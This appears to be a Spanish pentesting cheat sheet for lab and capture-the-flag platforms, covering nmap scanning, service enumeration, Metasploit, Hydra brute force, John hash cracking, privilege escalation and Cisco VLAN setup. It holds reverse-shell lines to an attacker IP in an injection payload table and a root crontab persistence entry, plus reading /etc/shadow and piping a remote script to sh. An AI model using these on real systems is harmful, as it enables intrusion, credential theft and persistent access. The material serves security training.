# üìñ Gu√≠a Maestra de Pentesting, Redes y Defensa v3.0
*S√≠ntesis y Metodolog√≠a de √âlite - Ejecuci√≥n Literal y Corregida*

---

## üéØ MISI√ìN Y FILOSOF√çA DE DISE√ëO
**Directiva v3.0:** Fusi√≥n literal del material de origen, respetando la estructura y formato existentes. Cero omisiones. Las definiciones de flags se presentar√°n en tablas contextuales, inmediatamente despu√©s de los comandos correspondientes. El objetivo es una consolidaci√≥n fiel y enriquecida de los documentos proporcionados.

---

## üì° FASE 0: CONFIGURACI√ìN DEL LABORATORIO Y CONECTIVIDAD
*Clarificaci√≥n de los conceptos de red para el descubrimiento de objetivos.*

### El Dilema de la Red: ¬øNAT, Red Interna o VPN?

*   **Escenario 1: Laboratorio Local (VMs en su PC)**
    *   **M√©todo:** **Red NAT Personalizada** o **Red Interna**.
    *   **L√≥gica:** Usted crea y controla la red (ej: `192.168.1.0/24`). No hay que "descubrir" la red. El descubrimiento del host se hace con `sudo nmap -sn 192.168.1.0/24` dentro de su propio entorno controlado.

*   **Escenario 2: Plataformas Externas (Hack The Box, TryHackMe)**
    *   **M√©todo:** **Conexi√≥n VPN** usando el archivo `.ovpn` que le proporcionan.
    *   **L√≥gica:** El archivo `.ovpn` lo conecta a la red del laboratorio. La plataforma le da la IP del objetivo. Su √∫nica tarea es verificar la conectividad con `ping [IP_OBJETIVO]`.

--- 

## üîç FASE 1: RECONOCIMIENTO

### 1.1. Reconocimiento B√°sico y Conectividad (Tabla de `pentesting2.md`)

| Tarea | Linux / macOS | Windows | Funci√≥n y Desglose de Opciones |
|---|---|---|---|
| Ver mi propia IP y MAC | `ip a` / `ifconfig` | `ipconfig /all` | Muestra IP, MAC, DNS. `/all` = todo. |
| Verificar si una IP responde | `ping [IP]` | `ping [IP]` | `-c [num]` (Linux), `-t` (Win). |
| Trazar ruta a un destino | `traceroute [IP]` | `tracert [IP]` | `-n` (Lnx), `-d` (Win). |
| Ver tabla de vecinos | `ip n` / `arp -a` | `arp -a` | Muestra tabla ARP. |
| Descubrir hosts locales | `sudo nmap -sn [Rango]` | `nmap -sn [Rango]` | `-sn` = Ping Scan. |
| Consultar info dominio | `whois [dominio]` | `whois [dominio]` | Registro p√∫blico. |
| Consultar DNS | `nslookup` / `dig` | `nslookup` | `dig -x`, `dig [dominio] MX`. |

### 1.2. Descubrimiento Activo de Red

```bash
# Conexi√≥n VPN a entorno objetivo
sudo openvpn archivo.ovpn

# Verificaci√≥n de interfaz VPN y mi IP
ifconfig tun0

# Descubrimiento de hosts activos en rango con Nmap
sudo nmap -sn [rango_red]
```

| Flag de `nmap` | Funci√≥n | Descripci√≥n Detallada |
|---|---|---|
| `-sn` | Ping Scan | No escanea puertos. Solo realiza descubrimiento de hosts para ver qu√© IPs est√°n activas. |

```bash
# M√©todos Alternativos de Descubrimiento
arp-scan -l
sudo nmap -PS22,80,443 192.168.1.0/24
```

| Flag de `nmap` | Funci√≥n | Descripci√≥n Detallada |
|---|---|---|
| `-PS` | TCP SYN Ping | Env√≠a paquetes SYN a los puertos especificados. Un host que responde (con SYN/ACK o RST) se considera activo. √ötil para evadir firewalls que bloquean pings ICMP. |

--- 

## üî¨ FASE 2: ESCANEO Y ENUMERACI√ìN

### 2.1. Escaneo Completo de Puertos y Servicios

```bash
# Escaneo completo de todos los puertos TCP, r√°pido y con output grepeable
nmap -p- --open -sS --min-rate 5000 -n -Pn [IP_objetivo] -oG allPorts
```

| Flag de `nmap` | Funci√≥n | Descripci√≥n Detallada |
|---|---|---|
| `-p-` | Escanear todos los puertos | Especifica que se deben escanear todos los puertos TCP del 1 al 65535. |
| `--open` | Mostrar solo puertos abiertos | Filtra los resultados para mostrar √∫nicamente los puertos que se encuentren en estado "open". |
| `-sS` | SYN Scan (Half-Open) | Escaneo sigiloso que no completa el handshake TCP, haci√©ndolo m√°s r√°pido y dif√≠cil de detectar. |
| `--min-rate` | Tasa m√≠nima de paquetes | Asegura que el escaneo no env√≠e menos paquetes por segundo que la cantidad especificada, acelerando el proceso. |
| `-n` | Sin resoluci√≥n DNS | Optimizaci√≥n de velocidad. Evita que nmap pierda tiempo resolviendo los nombres de dominio de las IPs. |
| `-Pn` | No hacer Ping | Asume que el host est√° activo y salta la fase de descubrimiento. Esencial para hosts que no responden a ping. |
| `-oG` | Output Grepeable | Guarda el resultado en un formato f√°cil de procesar con herramientas de l√≠nea de comandos como `grep`, `awk`, etc. |

```bash
# Procesamiento para extraer puertos a formato CSV
cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ','

# Escaneo detallado con scripts y versiones sobre los puertos encontrados
nmap -p [puertos_encontrados] -sC -sV [IP_objetivo] -oN targeted
```

| Flag de `nmap` | Funci√≥n | Descripci√≥n Detallada |
|---|---|---|
| `-p` | Especificar puertos | Escanea solo los puertos indicados en una lista separada por comas. |
| `-sC` | Script Scan por defecto | Ejecuta un conjunto de scripts de Nmap Scripting Engine (NSE) considerados seguros y √∫tiles para la enumeraci√≥n. |
| `-sV` | Detecci√≥n de Versi√≥n | Intenta determinar la versi√≥n del servicio que se ejecuta en cada puerto abierto. |
| `-oN` | Output Normal | Guarda el resultado en un formato de texto legible para humanos. |

### 2.2. An√°lisis de Puertos, Procesos y Servicios (Tabla Maestra de `pentesting2.md`)

| Tarea | Linux / macOS | Windows | Funci√≥n y Desglose de Opciones Clave |
|---|---|---|---|
| Vista General: Ver todas conexiones y puertos | `sudo ss -tunap` o `sudo netstat -tunap` | `netstat -ano` | Muestra lista completa de conexiones y puertos. |
| Diagn√≥stico Clave: Ver solo servicios en escucha | `sudo ss -tuln` o `sudo netstat -tuln` | `netstat -ano \| findstr "LISTENING"` | Ver servicios activos en la m√°quina. |
| Acci√≥n Principal: Buscar proceso que usa un puerto | `sudo ss -tulnp \| grep [PUERTO]` | `netstat -ano \| findstr "[PUERTO]"` | Obtiene PID del proceso que ocupa el puerto. |
| Paso Final: Liberar puerto matando proceso | `sudo kill -9 [PID]` | `taskkill /PID [PID] /F` | Libera puerto a la fuerza. |

| Flag de `ss`/`netstat` | Funci√≥n | Descripci√≥n |
|---|---|---|
| `-t` | TCP | Muestra sockets TCP. |
| `-u` | UDP | Muestra sockets UDP. |
| `-n` | Num√©rico | No resuelve nombres. |
| `-a` | All | Muestra todos los sockets (en escucha y establecidos). |
| `-p` | Proceso | Muestra el PID y nombre del proceso asociado al socket. |
| `-l` | Listening | Muestra solo los sockets en estado de escucha. |

### 2.3. Enumeraci√≥n Espec√≠fica por Protocolo

#### FTP (Puerto 21)
```bash
# Intentar login an√≥nimo
ftp [IP_objetivo]

# Scripts de enumeraci√≥n y vulnerabilidades FTP con Nmap
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-proftpd-backdoor [IP]
```

#### SSH (Puerto 22)
```bash
# Banner grabbing manual
nc [IP] 22

# Enumeraci√≥n de algoritmos y usuarios con Nmap
nmap -p 22 --script ssh-enum-algos,ssh-enum-users --script-args userdb=users.txt [IP]
```

#### SMB/NetBIOS (Puertos 139, 445)
```bash
# Listado de recursos compartidos (sin autenticaci√≥n)
smbclient -L //[IP_objetivo] -N
```

| Flag de `smbclient` | Funci√≥n | Descripci√≥n |
|---|---|---|
| `-L` | Listar | Enumera los shares (recursos compartidos) en el host objetivo. |
| `-N` | Sin Password | Realiza el intento de enumeraci√≥n como una "sesi√≥n nula", sin proporcionar credenciales. |

```bash
# Enumeraci√≥n completa y exhaustiva con enum4linux
enum4linux -a [IP_objetivo]
```

| Flag de `enum4linux` | Funci√≥n | Descripci√≥n |
|---|---|---|
| `-a` | All | Realiza todas las comprobaciones de enumeraci√≥n posibles (usuarios, shares, pol√≠ticas, etc.). Es la opci√≥n m√°s completa y ruidosa. |

```bash
# Scripts NSE para enumeraci√≥n y vulnerabilidades SMB
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln* [IP]
```

--- 

## ‚öîÔ∏è FASE 3: EXPLOTACI√ìN

### 3.1. B√∫squeda y Uso de Exploits

```bash
# B√∫squeda por servicio y versi√≥n con searchsploit
searchsploit samba 3.0.20

# Copiar exploit para an√°lisis y modificaci√≥n
searchsploit -m [ID_exploit]
```

| Flag de `searchsploit` | Funci√≥n | Descripci√≥n |
|---|---|---|
| `-m` | Mirror (Copiar) | Copia el exploit desde la base de datos local a tu directorio de trabajo actual. |

```bash
# B√∫squeda de m√≥dulos en Metasploit
msfconsole -q
search type:exploit platform:linux samba

# Configuraci√≥n y ejecuci√≥n de exploit
use exploit/multi/samba/usermap_script
show options
set RHOSTS [IP_objetivo]
set LHOST [IP_atacante]
exploit
```

### 3.2. Ataques de Fuerza Bruta con Hydra

```bash
# Ataque de fuerza bruta SSH
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://[IP_objetivo]

# Ataque a formulario web (HTTP POST)
hydra -L users.txt -P passwords.txt [IP] http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

| Flag de `hydra` | Funci√≥n | Descripci√≥n |
|---|---|---|
| `-L` | Lista de Usuarios | Especifica un archivo que contiene una lista de nombres de usuario a probar. |
| `-P` | Lista de Passwords | Especifica un archivo que contiene una lista de contrase√±as a probar. |
| `-l` | Usuario √önico | Especifica un √∫nico nombre de usuario a probar. |
| `-p` | Password √önico | Especifica una √∫nica contrase√±a a probar. |
| `-t` | Threads (Hilos) | Define el n√∫mero de intentos de conexi√≥n en paralelo. |
| `-w` | Wait (Espera) | Define un tiempo de espera en segundos entre cada intento, para evitar bloqueos. |
| `-f` | Finalizar al encontrar | Detiene el ataque tan pronto como se encuentra un par de credenciales v√°lidas. |

### 3.3. Cracking de Hashes con John the Ripper

```bash
# Combinaci√≥n de archivos del sistema para John
unshadow /etc/passwd /etc/shadow > hashes.txt

# Ataque con diccionario espec√≠fico
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Cracking con reglas avanzadas (mutaciones)
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Mostrar passwords crackeados
john --show hashes.txt
```

| Par√°metro de `john` | Funci√≥n | Descripci√≥n |
|---|---|---|
| `--wordlist` | Ataque de Diccionario | Utiliza el archivo de diccionario especificado para el ataque. |
| `--rules` | Ataque con Reglas | Aplica reglas de mutaci√≥n de palabras al diccionario para generar variaciones (e.g., `password` -> `P@ssw0rd1`). |
| `--format` | Formato de Hash | Especifica el algoritmo de hash a utilizar (e.g., `raw-md5`, `sha512crypt`). |
| `--show` | Mostrar Crackeados | Muestra las contrase√±as que ya han sido crackeadas para el archivo de hashes proporcionado. |

### 3.4. Payloads de Inyecci√≥n de Comandos (Tabla de `pentesting2.md`)

| Payload de Ejemplo | Funci√≥n |
|---|---|
| `127.0.0.1; whoami` | Ver usuario del proceso. |
| `127.0.0.1; uname -a` | Ver info sistema. |
| `127.0.0.1 && id` | Ejecuta `id` si el comando anterior tuvo √©xito. |
| `127.0.0.1; sleep 5 && echo "test"` | Blind injection por tiempo. |
| `127.0.0.1; nohup bash -c 'bash -i >& /dev/tcp/IP/PUERTO 0>&1' &` | Reverse shell persistente en segundo plano. |

--- 

## üöÄ FASE 4: POST-EXPLOTACI√ìN

### 4.1. Reconocimiento Post-Explotaci√≥n

```bash
whoami
id
uname -a
cat /etc/os-release
cat /etc/passwd
ps aux
netstat -tupln
arp -a
```

### 4.2. Escalaci√≥n de Privilegios

```bash
# Verificaci√≥n de permisos sudo (vector de escalaci√≥n clave)
sudo -l

# B√∫squeda de binarios SUID
find / -perm -u=s -type f 2>/dev/null

# B√∫squeda de tareas programadas
crontab -l

# Explotaci√≥n de Sudo/SUID (Referencia GTFOBins)
sudo nmap --interactive
nmap> !sh

# Scripts de Automatizaci√≥n para Escalaci√≥n
./LinEnum.sh
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### 4.3. T√©cnicas de Persistencia y Movimiento Lateral

```bash
# Persistencia via crontab
echo "*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/[IP_atacante]/4444 0>&1'" >> /var/spool/cron/root

# T√∫nel din√°mico (SOCKS Proxy) para pivoting
ssh -D 9050 user@[IP_objetivo]
```

| Flag de `ssh` | Funci√≥n | Descripci√≥n |
|---|---|---|
| `-D` | Dynamic Port Forwarding | Crea un proxy SOCKS en el puerto local especificado, que redirige el tr√°fico a trav√©s del servidor SSH remoto. |
| `-L` | Local Port Forwarding | Redirige un puerto local al puerto de un host remoto, accesible desde el servidor SSH. `ssh -L 8080:localhost:80 user@host`. |
| `-R` | Remote Port Forwarding | Redirige un puerto en el servidor remoto a un puerto en el host local. √ötil para exponer un servicio interno. |

```bash
# Configuraci√≥n y uso de proxychains
# (Editar /etc/proxychains4.conf y a√±adir "socks5 127.0.0.1 9050")
proxychains nmap -sT -Pn [IP_objetivo_interno]
```

--- 

## üåê FASE 5: INFRAESTRUCTURA DE RED Y CISCO (FUSI√ìN DE GU√çAS)

### 5.1. Fundamentos de la CLI de Cisco (Tabla de `pentesting2.md`)

| Modo | Prompt T√≠pico | Prop√≥sito Principal |
|---|---|---|
| EXEC del Usuario | `Router>` | Vista limitada, comandos b√°sicos. |
| EXEC Privilegiado | `Router#` | Acceso completo ("admin"). |
| Configuraci√≥n Global | `Router(config)#` | Cambios que afectan a todo el dispositivo. |
| Configuraci√≥n de Interfaz | `Router(config-if)#` | Configurar interfaz espec√≠fica. |

### 5.2. Configuraci√≥n de Dispositivos y VLANs (Tabla de `pentesting2.md`)

| Tarea | Comando(s) | Modo | Funci√≥n TL;DR |
|---|---|---|---|
| Crear y nombrar una VLAN | `vlan [n√∫mero]`<br/>`name [nombre_vlan]` | `(config)#` | Crea VLAN y le asigna nombre. |
| Asignar puerto a VLAN (Acceso) | `interface [nombre_puerto]`<br/>`switchport mode access`<br/>`switchport access vlan [n√∫mero]` | `(config)#` | Conecta dispositivo a VLAN espec√≠fica. |
| Configurar puerto Troncal (Trunk) | `interface [nombre_puerto]`<br/>`switchport mode trunk` | `(config)#` | Conecta switch/router, permite m√∫ltiples VLANs. |
| Guardar Configuraci√≥n | `copy running-config startup-config` | `#` | **CRUCIAL:** Guarda los cambios para que persistan.|

### 5.3. Enrutamiento Inter-VLAN (Router on a Stick) (Tabla de `pentesting2.md`)

| Tarea | Comando(s) | Modo | Funci√≥n TL;DR |
|---|---|---|---|
| 1. Activar interfaz f√≠sica | `interface [nombre_interfaz]`<br/>`no shutdown` | `(config)#` | Enciende puerto f√≠sico del router (sin IP). |
| 2. Crear Subinterfaz VLAN | `interface [nombre_interfaz].[sub-id]` | `(config)#` | Crea interfaz virtual para VLAN. |
| 3. Asignar VLAN y Encapsulaci√≥n | `encapsulation dot1q [n√∫mero_vlan]` | `(config-subif)#` | Define etiqueta VLAN (dot1q) para subinterfaz. |
| 4. Asignar IP a Subinterfaz | `ip address [IP_gateway] [M√°scara]` | `(config-subif)#` | IP para gateway de dispositivos VLAN. |

### 5.4. Diagn√≥stico y Verificaci√≥n (Tabla de `pentesting2.md`)

| Tarea | Comando show | Modo | Funci√≥n TL;DR |
|---|---|---|---|
| Resumen r√°pido interfaces | `show ip interface brief` | `#` | Muestra IPs y estado (up/up o down/down). **El m√°s √∫til.** |
| Estado f√≠sico de puertos | `show interfaces status` | `#` | Muestra estado, VLAN, d√∫plex, velocidad. |
| Resumen VLANs y puertos | `show vlan brief` | `#` | Muestra VLANs y puertos asociados. |
| Ver puertos troncales | `show interfaces trunk` | `#` | Lista puertos en modo trunk y VLANs permitidas. |
| Ver tabla MAC del switch | `show mac address-table` | `#` | Muestra MACs aprendidas, puerto y VLAN. |
| Ver tabla enrutamiento | `show ip route` | `#` | Confirma rutas conocidas por router. `C`=Conectada, `L`=Local. |

--- 

## üìä AP√âNDICE: TABLAS DE REFERENCIA ADICIONALES

### Tabla Maestra de Conflictos de Puertos (Fusionada de `pentesting2.md`)

| Puerto | Desarrollo Web y Datos | Herramientas de Ataque / Apps Vulnerables | Herramientas de Defensa / Monitoreo y Ops |
|---|---|---|---|
| 3000 | React, Next.js, Vue, Node.js | OWASP Juice Shop | Grafana |
| 8080 | Tomcat, Servidores Java | OWASP ZAP, Burp Suite, Web Goat | Kibana, Jenkins |
| 8000 | Django, Gunicorn, Jupyter | ‚Äî | Kong(proxy), Splunk |
| 5000 | Flask, Streamlit | Empire, Starkiller(API) | ‚Äî |
| 9200 | ‚Äî | ‚Äî | Elasticsearch |
| 5601 | ‚Äî | ‚Äî | Kibana |
| 9090 | ‚Äî | ‚Äî | Prometheus |
| 4444 | ‚Äî | Reverse Shells (Metasploit default) | ‚Äî |
